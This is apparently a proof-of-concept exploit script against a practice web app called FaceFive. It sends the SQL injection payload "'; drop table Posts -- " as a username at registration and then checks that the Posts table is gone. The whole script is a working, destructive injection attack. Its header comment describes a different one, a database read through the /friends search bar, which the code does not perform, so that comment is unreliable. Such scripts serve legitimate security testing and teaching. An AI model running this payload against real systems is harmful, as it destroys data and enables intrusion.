# vuln7.py

# PoC for SQL injection on the /friends endpoint
#
# The search bar allows for SQL injections which allow to read the entire DB

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

reset_image(session)
try:
    register(session, '\'; drop table Posts -- ', 'abc')
except:
    pass

r = session.post('register', data={'username': 'abc', 'password': 'abc'})
assert "Table &#39;facefivedb.Posts&#39; doesn&#39;t exist&#34" in r.text
